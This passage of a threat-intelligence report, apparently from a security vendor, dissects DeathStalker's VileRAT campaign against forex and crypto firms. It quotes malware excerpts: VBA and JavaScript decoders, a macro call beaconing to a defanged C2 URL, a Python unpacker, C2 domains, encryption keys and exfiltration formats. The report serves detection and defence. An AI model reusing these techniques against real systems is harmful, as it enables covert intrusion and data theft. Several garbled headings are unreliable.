Notably, we exposed why we believe the threat actor may fit a group of](https://securelist.com/what-did-deathstalker-hide-between-two-ferns/99616/)\nmercenaries, offering hack-for-hire services, or acting as an information broker to support competitive and financial intelligence efforts.\n\nMeanwhile, in August 2020, we also released a private report on VileRAT to our threat intelligence customers for the first time. VileRAT is a\nPython implant, part of an evasive and highly intricate attack campaign against foreign exchange and cryptocurrency trading companies. We\n[discovered it in Q2 2020 as part of an update of the Evilnum modus operandi, and attributed it to DeathStalker. Malicious activities that we](https://www.welivesecurity.com/2020/07/09/more-evil-deep-look-evilnum-toolset/)\nassociate with DeathStalker’s VileRAT track have been publicly and partly documented since, without any attribution or under different\n[monikers (Evilnum, PyVil), starting in September 2020, through](https://www.cybereason.com/blog/research/no-rest-for-the-wicked-evilnum-unleashes-pyvil-rat) [2021 and more recently in June 2022.](https://github.com/eset/malware-ioc/tree/master/evilnum#february-2021-pyvil-and-evilnum-update)\n\nDeathStalker has indeed continuously leveraged and updated its VileRAT toolchain against the same type of targets since we first identified it\nin June 2020. While we comprehensively documented the evolution to our threat intelligence customers recently, and despite existing public\nindicators of compromise, we regret to note that the campaign is not only ongoing at the time of writing, but also that DeathStalker likely\nincreased its efforts to compromise targets using this toolchain recently. We have indeed been able to identify more samples of VileRATassociated malicious files and new infrastructure since March 2022, which may be a symptom of an increase in compromise attempts. We\ndeemed it may be helpful to publicly expose some of our knowledge about VileRAT, to help potential targets better detect and stop such\nmalicious activities.\n\n## VileRAT’s initial infection and toolset overview\n\nBack in the summer of 2020, DeathStalker’s VileRAT initial infection consisted in spear-phishing emails sent to foreign exchange companies,\nfrom fake personas (a fake diamonds trading company for instance) who shared investment interests. Should the target reply and continue\nwith the conversation, the fake persona would at some point and upon request provide a link to a malicious file hosted on Google Drive (a\nWindows shortcut file masquerading as a PDF or in a ZIP archive), as identification documents. The malicious link would then trigger the\nexecution of arbitrary system commands, to drop a harmless decoy document, as well as a malicious and quite sophisticated binary loader that\nwe dubbed VileLoader.\n\nMore recently, since at least late 2021, the infection technique has changed slightly, but the initial infection vector is still a malicious message:\na Word document (DOCX, see Figure 1) is sent to targets via email (either as an attachment or embedded in the email body whenever\npossible). In July 2022, we also noticed that the attackers leveraged chatbots that are embedded in targeted companies’ public websites to\nsend malicious DOCX to their targets.\n\n\n-----\n\n**_Figure 1. Malicious DOCX social engineering message_**\n\nThe DOCX documents are frequently named using the “compliance” or “complaint” keywords (as well as the name of the targeted company),\nsuggesting the attacker is answering an identification request or expressing an issue as a reason to send them.\n\nThe initial infection and toolset deployment, as we observed them starting in at least late 2021, are schematized below (see Figure 2).\n\n\n-----\n\n**_gu e_** **_e_** **_ect o_** **_a d too set o e_** **_e_**\n\n## A bit of stomping and concealment up to VileDropper\n\nThe initial DOCX infection document itself is innocuous, but it contains a link to another malicious and macro-enabled DOTM document as a\n“remote template” (see Figure 3). These DOTM files are automatically downloaded by Word when the DOCX is opened, and its embedded\nmacro is triggered if the recipient enabled execution (as requested by the social engineering message, see Figure 1).\n\n\n1\n\n2\n\n3\n\n4\n\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n\n<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\nTarget=\"hxxp://plantgrn[.]com/HjSYaquyA5umRSZcy%2B0xLfaIdgf5Qq8BA6EggZELrzkAAADvNjKmxl00LiQYCUFp2DSHYB8NW18l94y4JmY\nTargetMode=\"External\"/>\n\n</Relationships>\n\n\n**_Figure 3. Malicious remote template inclusion in infection DOCX_**\n\n[The malicious DOTM remote templates leverage the VBA stomping technique to conceal the code of an embedded macro. VBA stomping](https://attack.mitre.org/techniques/T1564/007/)\ninvolves making the editable VBA source code (i.e., the visible code of a macro) different from the code that will actually be executed. This is\n[possible because both the editable (visible) source code and a transformed internal version of it called p-code are embedded in macro-enabled](https://github.com/bontchev/pcodedmp)\ndocuments. As a result of VBA stomping, the real macro code that will be executed is hidden from standard tools (Microsoft Word’s macro\n[edition tools, but also OLETools).](http://www.decalage.info/python/oletools)\n\nThis technique comes with a drastic limitation: the hidden macro (i.e., internal p-code) can only be executed if the macro-enabled document is\nopened with the same Office version from which it was generated. Otherwise, the hidden macro cannot run, and the visible one will be\nexecuted instead. In this last case, DeathStalker ensured it would result in a popup message to the user (see Figure 4). But most of all,\nDeathStalker ensured that it distributed several variants of infection documents to their targets, each one being prepared for a specific Office\nversion.\n\n**_Figure 4. VBA stomping failure in a malicious DOTM remote template_**\n\nIn any case, the visible and hidden macros download a picture to replace the social engineering message in the infection document (see\nFigure 5) and trick the readers into believing something failed.\n\n**_Figure 5. Example of a downloaded image upon macro execution_**\n\nIn the background, however, provided the VBA stomping worked, the DOTM-embedded macro silently gathers information about security\n[products that are installed on the target computer (using WMI), sends them to a command-and-control (C2) server, decodes and drops files,](https://docs.microsoft.com/en-us/windows/win32/wmisdk/creating-a-wmi-script)\nthen ultimately executes a malicious obfuscated JavaScript (JS) backdoor we called VileDropper.\n\nThe DOTM-embedded macro itself already reveals some interesting and specific techniques. It is lightly obfuscated, as most text strings are\nXOR-encoded (see Figure 6) with a password that is derived from a sentence (e.g., “Operates Catholic small towns pueblos Two of“).\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\nFunction decodestring(dt As String) As String\n\nOn Error Resume Next\n\nDim ks As String\n\nks = decodepassword\n\nDim dl As Long\n\ndl = ((Len(dt) / 2) - 1)\n\nkl = Len(ks)\n\nDim s As String\n\ns = \"\"\n\nFor i = 0 To dl\n\nDim c1 As Integer\n\nDim c2 As Integer\n\nc1 = Val(\"&H\" & Mid(dt, ((i * 2) + 1), 2))\n\nc2 = Asc(Mid(ks, (i Mod kl) + 1, 1))\n\ns = s & Chr(c1 Xor c2)\n\nNext\n\ndecodestring = s\n\nEnd Function\n\n\n**_Figure 6.

XOR decoding function in a PowerPepper VBS loader (MD5 DB6D1F6AB887383782E4E3D6E4AACDD0)_**\n\nThe DOTM-embedded macro decodes and drops two files (in the “%APPDATA%” folder: “Redist.txt” and “ThirdPartyNotice.txt”, or “pattern.txt”\n[and “changelog.txt”) out of encoded data that is stored in non-visible TextBox forms (see Figure 8). Leveraging Office object properties as](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/textbox-control)\nhidden data sources is also something we have previously seen with PowerPepper\n\n\n-----\n\n**_Figure 8. TextBox form used as a data store within malicious DOTM documents, as shown by Microsoft’s VBA editor_**\n\nAnother notable feature is that the DOTM-embedded macro signals progression or errors during the execution by sending HTTP GET requests\n[to fixed C2 URLs. Interestingly, all HTTP requests in the VBA macro are triggered using remote picture insertion functions (see Figure 9).](https://docs.microsoft.com/en-us/office/vba/api/word.shapes.addpicture)\n\n\n1\n\n2\n\n3\n\n\ndoc.Shapes.AddPicture\n(decodestring(\"09184015545D5B1B1B07501E001F5C4B0D1D5B3B2D3647143422115728383E1D3E2A024B06025B...0F1C02301C4B5774\n\n' hxxp://hubflash[.]co/HCSqfUN%2FJJnPO49gnojrpDo%2BMxnGrYaL161m49AhAAAA%2FwQ5Tgt6JlNO\n\npWd1chDdUc5MB1HWBB9Yq3EECIbTO8uX\n\n\n**_Figure 9. DOTM-embedded macro leverages “AddPicture” as a Web client_**\n\nIn any case, the DOTM-embedded macro finally triggers VileDropper’s execution, using a renamed copy of the “WScript” interpreter\n(“msdcat.exe” or “msgmft.exe” in the “%APPDATA%” folder), with a command such as:\n\n1 msgmft.exe /E:jScrIpt \"\\changelog.txt\" 91 pattern.txt\n\n“changelog.txt” is VileDropper, while “91” is part of password used by VileDropper to decode XORed data, and “pattern.txt” is an encoded\npackage that contains VileLoader.\n\n## VileDropper: an overly obfuscated task scheduler\n\nNext in DeathStalker’s intricate VileRAT infection chain comes VileDropper. It is an obfuscated JavaScript file that mainly drops and schedules\nthe execution of the next stage: VileLoader.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n\nvar _0x140c9e;//ACCS3\n\n_0x36bbe9: {//ACCS3\n\ntry {//ACCS3\n\nvar _0x527036 = _0x112a30 + '\\x5c' + WScript[_0x1dbcbb(0x38c)](0x1),//ACCS3\n\n_0x33ee6e = _0x3b3918[_0x4462ad[_0x1dbcbb(0x312)](_0x4459df, _0x4462ad[_0x1dbcbb(0x23d)])](_0x527036,\n0x1),//ACCS3\n\n_0x46efdf = _0x33ee6e[_0x4459df(_0x1dbcbb(0x1e7) + _0x1dbcbb(0x29c))]();//ACCS3\n\n_0x33ee6e[_0x1dbcbb(0x37a)](), _0x3b3918[_0x1dbcbb(0x38f)](_0x527036), _0x527036 = '';//ACCS3\n\nfor (_0x33ee6e = 0x0; _0x33ee6e < _0x46efdf[_0x1dbcbb(0x2fa)] - 0x2; _0x33ee6e += 0x2)//ACCS3\n\n_0x527036 += String[_0x1dbcbb(0x259) + 'de'](parseInt(_0x46efdf[_0x1dbcbb(0x2f4)](_0x33ee6e, _0x33ee6e + 0x2),\n0x10));//ACCS3\n\n_0x140c9e = _0x527036;//ACCS3\n\nbreak _0x36bbe9;//ACCS3\n\n} catch (_0x48c9c6) {}//ACCS3\n\n_0x140c9e = void 0x0;//ACCS3\n\n}//ACCS3\n\n\n**_Figure 10. VileDropper code excerpt in its original form_**\n\nVileDropper needs at least two arguments to run for the first time (a third may be used as a flag to trigger environment-specific execution\nvariations, depending on security products that are installed on targeted computers):\n\nthe first one is a partial password (used to decode XOR-encoded data),\nthe second is a path to an encoded payload file (contains VileLoader and its companion shellcode).\n\nVileDropper also checks its interpreter and file name, to immediately stop execution if it is not called as planned (this is probably done to evade\nsandboxes), as can be seen in the following deobfuscated code excerpt:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\nif (aWShell1[\"CurrentDirectory\"][\"toLowerCase\"]() != aAppDataPath1[\"toLowerCase\"]()) {\n\nWScript[\"Quit\"]();\n\n}\n\nif (!sArgThird1) {\n\nif (-0x1 == aScriptHostFullpath1[\"indexOf\"](\"msdcat\")) {\n\nWScript[\"Quit\"]();\n\n}\n\n} else {\n\nif (-0x1 == aScriptHostFullpath1[\"indexOf\"](\"cscript\")) {\n\nWScript[\"Quit\"]();\n\n}\n\n}\n\n\n**_Figure 11. Deobfuscated execution check in VileDropper_**\n\nVileDropper’s exact execution flow depends on the security products that are installed on the targeted computer, but most of the time, it copies\nitself to another file, relaunches itself, and deletes its original copy. During execution VileDropper:\n\ngathers additional data on the targeted environment (using WMI) as well as generating a target identifier and sends them to a C2 server;\ndecodes and drops VileLoader and its encoded companion shellcode. The file names and location will vary depending on samples, but\nthey are placed under a seemingly legitimate common folder in “%APPDATA%” (e.g., “exe” and “dev0Y11ZF.tmp” in\n“%APPDATA%\\Microsoft\\Printer Settings\\Printers\\”);\n\n\n-----\n\nsc edu es a tas to u e oade 35 to 65 seco ds ate, t e de te y e e y t ee ou s a d 5 utes\n\nVileDropper sends data to a C2 server using an HTTP GET request to a fixed URL (e.g., “hxxp://hubflash[.]co/admin/auth.php”), using a preset\nUser-Agent (both the C2 URL and the User-Agent change depending on VileDropper samples). The useful information is stored as a JSON\ndocument, which is then XOR-encoded, base64-encoded, URL-encoded, and set as a cookie value in the HTTP request:\n\n\n**JSON**\n**Key**\n\n\n**Content (JSON value)**\n\n\nu A target identifier. The identifier is a custom UUID-like representation of the target’s login (%USERNAME% environment variable)\nand computer UUID (as obtained in the first result of the WMI query: SELECT UUID FROM Win32_ComputerSystemProduct). This\nUUID-like value is then base64-encoded and URL-encoded. Due to fixed lengths and padding from the identifier generation logic,\nthe identifier’s final form is always 48 characters long.\n\nd A hard-coded VileDropper identifier, which might designate a campaign or version (e.g., “9745B355”).\n\na A list of the names of the security products (AntiVirusProduct in WMI) that are installed on the target computer, separated by the\npipe sign (|), then XORed, base64-encoded and URL-encoded.\n\nn The target’s fully qualified login, as the shell expansion of “%USERDOMAIN%\\%USERNAME%”, which is then XORed, base64encoded and URL-encoded.\n\nw The target’s operating system version, as returned from the WMI query SELECT Version FROM Win32_OperatingSystem, then\nbase64-encoded and URL-encoded.\n\nThe task that is [scheduled by VileDropper (whose name varies depending on samples, e.g., “CDS Sync” or “UpdateModel Task”), triggers the](https://docs.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--scripting-)\nfollowing type of execution command:\n\n1 %APPDATA%\\Microsoft\\Printer Settings\\Printers\\FWDeviceEnabler.exe \"[u]\" \"<encoded companion shellcode file name>\" \"[a]\" \"[w]\" 0 \"\n\n[d]\" \"[n]\" <a letter of the encoded companion shellcode file name>\n\nThe characters between square brackets (such as [u]) in the command line designate the content of the corresponding JSON key (i.e., [u] is\nthe encoded target identifier).\n\n## A XORing interlude\n\nBefore moving on to VileLoader, a note on the XOR encoding scheme that is leveraged by VileDropper to protect data sent to the C2 server, as\nsimilar schemes will be used further on. The algorithm generates data blobs that are laid out as follows (then sometimes further base64encoded and URL-encoded):\n\nType A:\n\n1 [XOR key (6 random bytes)][XOR-encoded data]\n\nThe resulting blobs are self-sufficient and can be decoded by the recipient (as well as any third party…) without any access to the pre-shared\nkey. In VileDropper, strings that are encoded as part of the JavaScript obfuscation benefit from an additional XORing step: the XOR key that is\nembedded in data blobs is additionally XORed with a script-specific fixed password (a part of this fixed password is passed to VileDropper on\nits execution command line by the previous DOTM macro in the infection chain, the other part is hard-coded in VileDropper itself).\n\nLater, VileLoader and VileRAT use other variants of this algorithm, which produces data blobs that are laid out as one of the following options:\n\nType B:\n\n1 [XOR key length (variable)][XOR key (random bytes)][Padding][XOR-encoded data]\n\nType C:\n\n1 [XOR-encoded data length][XOR-encoded data][XOR key length (variable)][XOR key (random bytes)]\n\nType D:\n\n1 [XOR key length (variable)][XOR key (random bytes)][XOR-encoded data length][XOR-encoded data]\n\n## VileLoader: an evasive multi-stage implant downloader\n\n\n-----\n\ne oade s a e a ab e p ece o t e e co p o se app oac e t as e sted s ce Q 0 0 ( t as [st pub c y docu](https://www.cybereason.com/blog/research/no-rest-for-the-wicked-evilnum-unleashes-pyvil-rat) e ted as\ndddp.exe), it has been continuously updated and maintained since, and is still deployed from VileDropper at the time of writing. VileLoader’s\nmain goal is to download and execute an additional payload from a C2 server. Though we have only observed it triggering the execution of\nVileRAT, the loader can technically download and execute other implants.\n\nRecent VileLoader samples are composed of a binary executable (stage 1) and an encoded companion shellcode file (stage 2). Previous\nsamples of VileLoader usually embedded the shellcode within the binary executable directly, and presented themselves as a single monolithic\nfile.\n\n### Stage 1 – Doctored binary unpacker\n\nVileLoader is initially presented as a binary executable, which ensures the first stage of the execution. This binary is always a legitimate one,\nwhich is meticulously doctored by the attackers to integrate a malicious unpacker-type payload. As such, the binary may appear legitimate\nfrom a quick automated static code analysis perspective: it includes all the code of a legitimate application (but will not work as expected). This\n“unpacker” stage is aimed at decoding, loading, and executing the second stage in memory.\n\nVileLoader’s workflow starts by waiting 17 seconds. Then it parses the command line arguments. The command line must include five\narguments at least, or VileLoader terminates the execution. In practice, VileDropper usually gives seven arguments to VileLoader, as we have\npreviously described. VileLoader then opens its encoded companion shellcode file (whose name is passed as a second argument to\nVileLoader, e.g., “devENX1C6SS.tmp”), reads and decodes it (using the Type B XOR algorithm), maps the deobfuscated data in a region with\nread, write and execute (RWX) permissions, and runs the next stage (stage 2) by starting a new thread.\n\nVileLoader’s first stage contains very unique “signature” techniques that have been stable since the first sample we analyzed in Q2 2020:\n\n“Sleep” and “GetTickCount” Windows API functions are leveraged to generate random waiting delays. Those functions are resolved in an\nunusual way: by referencing hard-coded offsets from the beginning of the current binary image that point directly to entries in the\nlegitimate executable’s import address table (IAT);\nthe unpacking and loading of VileLoader’s encoded companion shellcode file leverages multiple custom-made system calls, that are\n[similar to low-level Windows API functions (NTDLL) for different Windows versions: NtOpenFile, NtReadFile, NtAllocateVirtualMemory,](https://www.geoffchappell.com/studies/windows/win32/ntdll/api/index.htm)\nNtCreateThreadEx and NtWaitForSingleObject (see Figure 12).\n\n**_Figure 12. VileLoader’s stage 1 custom-made system call_**\n\nHowever, while older samples parsed command line arguments by resolving and calling dedicated Windows API functions (such as\n[“GetCommandLineW”), the recent samples directly read this information from their own PEB (Process Environment Block) structure. This may](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)\nhave been done to better bypass the detection of some security solutions.\n\n### Stage 2 – In-memory downloader\n\nThe second stage content is extracted from VileLoader’s encoded companion shellcode file, and run by VileLoader’s first stage in-memory, in a\nnew thread. From a data perspective, the second stage shellcode (once unpacked by the first stage) is a PE binary that is stripped of its\nheaders and embeds additional encoded data.\n\nThis second stage starts by decoding the required data from its own content (using the Type C XOR algorithm). Some data are decoded as\n[hash values that were generated with the djb2 algorithm. Those hashes are in turn used to resolve the required function imports through a](http://www.cse.yorku.ca/~oz/hash.html)\nhomebrew IAT: required libraries are loaded, their export tables are parsed, exported function names are hashed with djb2, and the hashes are\ncompared to hashes that were decoded from internal data. Stage 2 continues by creating a mutex, whose name has been stable since Q2\n2020, and which is the same as in VileRAT (“Global\\wU3aqu1t2y8uN”).\n\nFinally, VileLoader’s second stage builds an HTTP GET request that is used to download an implant package. In older VileLoader samples, the\ndownloader used a static URL that looked as follows:\n\n1 http://<domain>/c&v=2&u=<argument 1>&a=<argument 2>&c=<argument 3>\n\nThe only evasion attempt consisted in randomly choosing an HTTP User-Agent header value amongst a fixed list of four. VileLoader used the\ntargeted system’s uptime as a source of “randomness”. In recent samples, developers tried to improve these evasion techniques, and the\nHTTP request now looks like this:\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n\nGET /administrator/index.php HTTP/1.1\n\nConnection: keep-Alive\n\nAccept-Language: en-US,en;q=0.8\n\nAccept: */*\n\nReferer: http://www.yahoo.com\n\nCookie: source=<encrypted blob>;\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36\n\nHost: corstand[.]com\n\n\nAll values that are colored in red are now chosen at random from a hard-coded list that is decoded from the stage 2 content (using the Type C\nXOR algorithm). The encrypted blob (cookie value) is initially a JSON dictionary, encrypted with the RC4 algorithm (using the key “BD DE 96\nD2 9C 68 EE 06 49 64 D1 E5 8A 86 05 12 B0 9A 50 00 4E F2 E4 92 5C 76 AB FC 90 23 DF C6”, decoded from stage 2 content), XORed\n(using the Type B XOR algorithm), base64-encoded and URL-encoded. The actual JSON content is very similar to the one that is sent by\nVileDropper to the C2 server:\n\n\n**JSON**\n**Key**\n\n\n**Provided by VileDropper via the**\n**command line**\n\n\n**Value**\n\n\nv Hard-coded value (65 in the last sample we analyzed) which might be a version\nnumber.\n\nu ✔️ The target identifier.\n\na ✔️ The list of security solutions installed on the targeted computer.\n\nw ✔️ The target’s operating system version.\n\nd ✔️ A fixed identifier, which might designate a campaign or version.\n\nn ✔️ The target’s fully qualified login (%USERDOMAIN%\\%USERNAME%).\n\nr Flag that indicates if the mutex creation succeeded (1) or failed (0).\n\nxn Current process name (e.g., SerenadeDACplApp.exe).\n\ns Constant value embedded in the code and equal to 0.\n\nThe C2 server then answers in the HTTP response body, with one of the following instructions:\n\ndo nothing: the answer is four null bytes;\nimplant package: the answer is an encoded implant package to parse (see later);\nsend a screenshot: the answer is a byte of value “1”, followed by three null bytes.\n\nIn older variants, VileLoader’s second stage did not embed the screenshot capability, which was, however, implemented in VileRAT.\n\nIf the C2 server answers with an implant package, it sends a Type D XORed blob. The resulting data is further decompressed using the\n[LZMA1 algorithm, and contains one or several “files” with the following additional metadata:](https://www.7-zip.org/sdk.html)\n\nA [CSIDL value, representing the root folder in which the file must be dropped (resolved with the “SHGetFolderPathW” Windows API](https://docs.microsoft.com/en-us/windows/win32/shell/csidl)\nfunction);\nA subdirectory name;\nA file name;\nA task name if the file execution is to be scheduled;\nThe command-line arguments if the file is to be executed.\n\nIf a specific flag is set in the C2 server response data, VileLoader creates a Windows scheduled task for the last dropped file to set up its\n[persistence. The task is created using the ITaskService interface. Finally, the last dropped file is also immediately executed using the](https://docs.microsoft.com/en-us/windows/win32/api/taskschd/nn-taskschd-itaskservice)\n“CreateProcessW” Windows API function. It should be noted that some older VileLoader samples executed the downloaded payload in\nmemory, while recent variants tend to drop the downloaded implant on the target’s filesystem.\n\nIf the C2 server requests a screenshot, then VileLoader stage 2 sends an HTTP POST request with a cookie whose value is a XORed (Type B\nalgorithm) JSON dictionary containing the following fields:\n\n**JSON Key** **Value**\n\n\n-----\n\nu Target identifier.\n\nsc Constant value (1).\n\ndt Screenshot timestamp (in the format “YYYY-MM-DD HH:MM:SS”).\n\nThe associated HTTP POST body data is an encoded (using the Type B XOR algorithm) JPEG screenshot.\n\n## VileRAT – A super-packed yet still overweight Python implant\n\nVileRAT is the last known stage of the intricate eponym infection chain from DeathStalker. It is an obfuscated and packed Python3 RAT,\n[bundled as a standalone binary with py2exe. We first discovered it in Q2 2020, and it has also subsequently been named PyVil by other](https://www.py2exe.org/)\nvendors.\n\n### A note on VileRAT’s seniority\n\nThe Python library (DLL) that is embedded in a py2exe-bundled binary usually comes from an official Python release. While analyzing VileRAT\nsamples, we noticed that its Python DLL is a custom compilation of Python 3.7 sources: the DLL version is tagged as “heads/3.7-dirty”[1]\n(instead of “tags/v3.7.4” for an official release, for instance) and references a shortened Git commit ID of “0af9bef61a”. This shortened commit\n[ID matches one in the source code repository of the 3.7 branch of the standard CPython implementation, which is dated to 2020-05-23. Due to](https://github.com/python/cpython/commit/0af9bef61afffbf128aba76a2e578059621b4f00)\nthis commit date and considering the fact that we first discovered VileRAT in Q2 2020, we believe with medium to high confidence that VileRAT\nwas first packaged for deployment in June 2020.\n\n### Unpacking VileRAT\n\n[When we first encountered VileRAT, we noticed that all usual decompiling tools for Python3 (uncompyle6,](https://pypi.org/project/uncompyle6/) [decompyle3 and](https://pypi.org/project/decompyle3/) [unpyc37, to name](https://github.com/andrew-tavera/unpyc37/)\njust a few) failed to correctly retrieve a Python source from the VileRAT bytecode. Some of our industry peers had the same issue when they\n[encountered it as PyVil.](https://www.cybereason.com/blog/research/no-rest-for-the-wicked-evilnum-unleashes-pyvil-rat)\n\nLong story short: the first stage of VileRAT has been obfuscated at the Python bytecode-level, with the intention of breaking existing\ndecompilers (see Figure 13). The bytecode is obfuscated by:\n\nadding multiple operations that do not have any effect when executed (neutral operations) and useless data;\nadding confusing branching and exceptions handlers;\ninserting invalid bytecode in sections that will never be reached during execution (but that decompilers still try – and fail – to decompile).\n\n**_Figure 13. VileRAT’s first stage Python bytecode, in its original form (left) and deobfuscated form (right). The only useful instructions_**\n**_of this excerpt are highlighted in red._**\n\n\n-----\n\nO ce c ea ed at bytecode e e, t e st stage o e u pac g ca be p ope y deco p ed as yt o code\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n\nimport sys\n\nimport zlib\n\nimport base64\n\nT8 = base64.b64decode\n\ny6 = zlib.decompress\n\nm5 = T8(b'<a 7-million+ characters long base64 string>')\n\nk9 = bytearray(m5)\n\nY7 = bytearray(b'0sMIsDYmkeST5ZJHOfHkwmrA5JGVmpBbpKeA')\n\nN2 = bytearray(len(k9)*bytes([0]))\n\nj = 0\n\ncode_length = int(len(k9)/5)\n\nfor i in range(code_length):\n\nif i % 3 == 0:\n\nN2[i] = k9[i] ^ Y7[j]\n\nN2[i] = k9[i]\n\nif j + 1 == len(Y7):\n\nj = 0\n\nj += 1\n\nN2[i:] = k9[i:]\n\nexec(y6(N2))\n\n\nVileRAT embeds no less than three layers of unpacking. The efforts that have been put into making a Python script (VileRAT) hard to analyze\nfrom a human perspective is a DeathStalker signature by itself, considering they also tried the same for all the other steps in the infection\n[chain, and that it is part of their usual approach.](https://securelist.com/what-did-deathstalker-hide-between-two-ferns/99616/)\n\nThe last unpacking step finally extracts the VileRAT Python code and a whole bundle of its dependencies in memory – all this content causes\npy2exe-bundled VileRAT samples to weigh around 12MB. The unpacking leverages decoding (using the Type B XOR algorithm) and BZIP2\ndecompression. The final VileRAT Python package notably contains a conf.pyc module which includes a version number, as well as default C2\ndomain names:\n\n\n1\n\n2\n\n3\n\n4\n\n\nVERSION = 7.2\n\nSVC_NAME = 'AJRouter'\n\nserver_urls = ['hxxp://pngdoma[.]com', 'hxxp://robmkg[.]com', 'hxxp://textmaticz[.]com', 'hxxp://goalrom[.]com']\n\nuser_agent_list = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63\nSafari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159\nSafari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164\nSafari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212\nSafari/537.36']\n\n\n### VileRAT versions and functionalities\n\nWe analyzed and compared various VileRAT samples, containing version numbers ranging from 2.4 to 8. VileRAT functionalities have not\nchanged much over time, and some functionalities from the earliest sample we analyzed have actually been dropped (such as leveraging SSH\nas a C2 channel, or screenshotting, the latter now being implemented in VileLoader instead). The remaining functionalities include:\n\nArbitrary remote command execution, using an existing or downloaded binary;\nEstablishing SSH connections to remote servers, possibly leveraging them to forward ports of the targeted computer to the remote\nserver;\nKeylogging;\nSetting up persistence using scheduled tasks;\n\n\n-----\n\nst g secu ty so ut o s t at a e sta ed o t e ta get co pute ;\nSelf-updating from a C2 server.\n\nVileRAT has five distinct and exclusive execution modes, enabled from the command line, which can all be further altered with additional\ncommand switches, parameters and/or data from the C2:\n\n\n**Command**\n**line**\n**option**\n\n\n**Internal name(s)** **Execution mode description**\n\n\n-a enc_cmd_data\nRUN_CMD_AS_USER_ARG\n\n-l enc_cmd_data_rss\nRUN_R_SSH_SHELL_ARG\n\n-r enc_cmd_data_rds\nRUN_R_DYN_SSH_ARG\n\n\n**Arbitrary command execution**\nThe “command” term is quite large: it can either be an existing binary, a shell command, a\ndownloaded executable, a Python package, or an internal VileRAT function. In order to specify\nthe “command”, a JSON dictionary[2] is passed as an optional parameter. Some commands will\nbe executed by starting VileRAT again, using a distinct set of command options. VileRAT exits\nafter this execution.\n\n**SSH connection test**\nVileRAT starts a new process of itself, which connects to a remote SSH server (using a private\nkey), then… closes the connection. This SSH connection used to serve as a C2 channel in\nprevious samples, but the C2 logic has been removed in recent samples. In order to specify the\nSSH connection settings, a JSON dictionary is passed as an optional parameter. VileRAT exits\nafter this execution.\n\n**SSH-tunneled local port forward**\nVileRAT starts a new process of itself, which connects to a remote SSH server (using a\npassword). This connection is leveraged as a tunnel to forward ports from the target computer\nto the remote server. In order to specify the SSH connection settings, a JSON dictionary is\npassed as an optional parameter. VileRAT quits once the remote end has connected to the\nforwarded port at least once, and subsequently closed the connection.\n\n\n-c cp_exe_path **Arbitrary file deletion**\nVileRAT attempts to delete a file, whose path is given as a clear text command parameter.\nVileRAT quits when the file is deleted or when the maximum number of attempts (10) is\nreached.\n\n\n-t rts\nIS_TASK_SCHED_ARG\n\n\n**Main C2 client mode**\nThis is the main execution mode for VileRAT. It regularly polls a C2 server for commands to\nexecute. The commands that can be executed are one of those described in this table\n(RUN_R_SSH_SHELL_ARG, RUN_CMD_AS_USER_ARG, RUN_R_DYN_SSH_ARG), or one\nof the additional VileRAT internal update commands. CMD_UPDATE_SVC triggers a (partial or\ncomplete) VileRAT update from a C2-downloaded package, while CMD_UPDATE_CONF can\nupdate internal delays and enable a keylogger if the C2 requires so.\n\n\nIn a typical first execution for VileRAT, as we identified in 2022, the implant is started with the following arguments:\n\n1 ImagesInfo.exe \"[u]\" -x -m \"EDP CredsTask\" -i\n\nNote than in this case, the target identifier that is passed as the first argument is not actually exploited by VileRAT, and may just be used by the\nattacker to easily identify running VileRAT processes later. Older VileRAT variants were usually launched with explicit “-f” and “-t” command\nline switches: those are now implicit and enabled by default.\n\nHere is the list of some notable VileRAT changes we spotted as the versions evolved, apart from regular updates to fix code bugs or handle\nuncaught exceptions, refactor code, update dependencies, and change configuration:\n\nBetween versions 2.4 and 2.7, VileRAT dropped the capability to use a remote SSH server as a C2 channel, as well as the screenshot\nimplementation;\nIn version 3.0, the base64-encoded RC4 key which is used for various encryption routines changed from\n“Ixada4bxU3G0AgjcX+s0AYndBs4wiviTVIAwDiiEPPA=” to “XMpPrh70/0YsN3aPc4Q4VmopzKMGvhzlG4f6vk4LKkI=”, and an additional\nXOR pass (of Type B) was added in encoding schemes. The VileRAT remote update mechanism was refactored, and an additional\ncommand switch (called pmode) was added;\nIn version 3.7, specific Chrome version and Trezor wallet reconnaissance functions that we initially identified for version 2.4 were\nremoved from the code, and VileRAT lost the ability to update from files provided on the filesystem where it was running;\nIn version 5.4, the way UUID-type identifiers were generated changed;\nIn version 6.5, an additional command switch (called jmode) was added;\nIn version 6.6, “-f” and “-t” command options were enabled by default.\n\n\n-----\n\n### e C p otoco\n\nVileRAT’s main C2 communication loop, as executed during Main C2 client mode (as described in VileRAT functionalities above), is quite\nstraightforward and runs in a separate thread:\n\nEvery 2-5 minutes, VileRAT tries to send an HTTP POST 